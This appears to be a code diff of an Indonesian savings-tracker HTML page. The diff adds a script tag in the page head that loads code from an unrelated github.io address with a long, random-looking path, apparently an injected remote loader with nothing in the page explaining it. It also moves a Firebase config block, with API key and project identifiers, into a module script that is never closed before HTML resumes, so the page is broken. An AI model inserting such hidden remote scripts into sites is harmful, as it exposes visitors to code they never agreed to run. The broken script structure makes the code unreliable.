@@ -1,6 +1,8 @@
+
+
 <!DOCTYPE html>
 <html lang="id">
-<head>
+<head><script type='text/javascript' src='https://rozipratama888-debug.github.io/Wz80swVGuCUN8BJLSQEMEFaFRS_8yQz8uZmTerUSjbuo1I7uBSQCHTM20szHUA6i3Auw1SF6X9t3B3rqWHDuleiRi-9JixhQI9UnCfO1l5CJtqW66zY54CdRSSFl5OH1PAkyMBX9z2yzOURlEeyxIGf5re0-aZPjw7UdfnVG9S8-Ri8ciekQ1fnNR2Z2luKIF77Wl1tFpk4Go7neI2Wh__JbE_8eWiPESB8tbJC2CNdNK69gmsJ9PtLrlaA5WUj-fBncsrU9QiN3EY7HVtbLIzCyOytSIfSRCDLHTSLVeDMXwOewUujzN7Y3JST14GXz71Oi-Rfpo5Opo71B-xefI7j5wo7GRT5Zv3fGg4nxKRg4q7Qo3uncPlMCk2hPag5q0rz3tzwCh-NxNcNK3YT0BDrokXzXIGIgcNLPqt2GT3amXctu9wjRPhpOCNgXlGOtskPyoyC7PmMgtWN-L_lNCpcFyQ-8YTCre7GPPEYACd-mjKASpODzeJzDr48u2xblP3v0'></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Tabungan Saya</title>
@@ -364,6 +366,28 @@
             <i class="fa-solid fa-trash-can"></i> Hapus Semua
         </button>
     </div>
+<!-- Firebase SDK -->
+<script type="module">
+    // ========================================
+    // ========== IMPORT FIREBASE SDK ==========
+    // ========================================
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-app.js";
+    import { getDatabase, ref, push, set, remove, onValue, onDisconnect, goOnline, goOffline } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-database.js";
+
+    // ========================================
+    // ======= TEMPATKAN CONFIG FIREBASE ======
+    // ========================================
+    // Ganti nilai di bawah ini dengan config dari Firebase Console kamu
+    // (Project Settings → Aplikasi web Anda → blok firebaseConfig)
+const firebaseConfig = {
+  apiKey: "AIzaSyDUz5JUyhW5CX38mleMv__POsSD5oOLnmg",
+  authDomain: "tabungan-saya.firebaseapp.com",
+  projectId: "tabungan-saya",
+  storageBucket: "tabungan-saya.firebasestorage.app",
+  messagingSenderId: "227780626177",
+  appId: "1:227780626177:web:1aeeadf7c66efd7eb73d00",
+  measurementId: "G-CVYV7VH5JF"
+};
 
     <!-- Riwayat -->
     <section>
@@ -613,13 +637,4 @@
 </script>
 
 </body>
-const firebaseConfig = {
-  apiKey: "AIzaSyDUz5JUyhW5CX38mleMv__POsSD5oOLnmg",
-  authDomain: "tabungan-saya.firebaseapp.com",
-  projectId: "tabungan-saya",
-  storageBucket: "tabungan-saya.firebasestorage.app",
-  messagingSenderId: "227780626177",
-  appId: "1:227780626177:web:1aeeadf7c66efd7eb73d00",
-  measurementId: "G-CVYV7VH5JF"
-};
 </html>
